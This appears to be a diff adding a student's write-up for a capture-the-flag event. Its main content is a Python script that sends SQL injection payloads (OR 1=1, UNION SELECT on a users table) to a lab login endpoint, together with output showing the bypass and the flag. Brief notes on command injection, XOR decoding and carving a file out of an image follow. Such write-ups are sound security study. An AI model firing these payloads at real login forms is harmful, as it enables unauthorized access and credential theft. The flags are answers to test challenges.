@@ -1,0 +1,84 @@
+### docs for the wth ctf
+
+1.  used this script to get the flag
+
+```
+# brute.py
+
+import requests
+
+# Define the URL of the login API
+url = 'http://10.7.35.138:8791/login'
+
+# List of payloads to test
+payloads = [
+    {"username": "admin' OR '1'='1", "password": "password"},
+    {"username": "admin' OR '1'='1' --", "password": "password"},
+    {"username": "' OR 1=1 --", "password": "password"},
+    {"username": "' UNION SELECT null, username, password FROM users --", "password": "password"},
+    {"username": "' AND 1=2 UNION SELECT null, username, password FROM users --", "password": "password"}
+]
+
+# Function to test the payloads
+def test_payloads(payloads):
+    for payload in payloads:
+        response = requests.post(url, data=payload)
+        print(f"Testing payload: {payload}")
+        print(f"Status Code: {response.status_code}")
+        print(f"Response Text: {response.text}\n")
+
+# Run the script
+if __name__ == "__main__":
+    test_payloads(payloads)
+
+```
+
+output:
+```
+Testing payload: {'username': "admin' OR '1'='1", 'password': 'password'}
+Status Code: 200
+Response Text: Login successful! Here is your flag: wth{sleep_well_after_injection}
+
+Testing payload: {'username': "admin' OR '1'='1' --", 'password': 'password'}
+Status Code: 200
+Response Text: Login successful! Here is your flag: wth{sleep_well_after_injection}
+
+Testing payload: {'username': "' OR 1=1 --", 'password': 'password'}
+Status Code: 200
+Response Text: Login successful! Here is your flag: wth{sleep_well_after_injection}
+
+Testing payload: {'username': "' UNION SELECT null, username, password FROM users --", 'password': 'password'}
+Status Code: 500
+Response Text: <!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
+
+Testing payload: {'username': "' AND 1=2 UNION SELECT null, username, password FROM users --", 'password': 'password'}
+Status Code: 500
+Response Text: <!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+```
+flag: <mark> wth{sleep_well_after_injection}</mark>
+
+### q2.
+
+ used ls after IP address to list files in the directory and used cat flag.txt to read flag
+
+### q3.
+
+ Used online tools binary ninja to decompile the binary file and get the flag by xorring the strings present in the binary file with 17 to get the flag. 
+
+ flag: <mark> </mark>
+
+### q4.
+
+used binwalk to check present files in the image and used dd to extract the files from the image.
+command : dd if='/mnt/d/platform-tools/wth/tech_council_logo (1).png' bs=1 skip=18368 of=extracted_image_partial.gif
+
+It gave a give which had rickroll video and the flag was present in the gif.
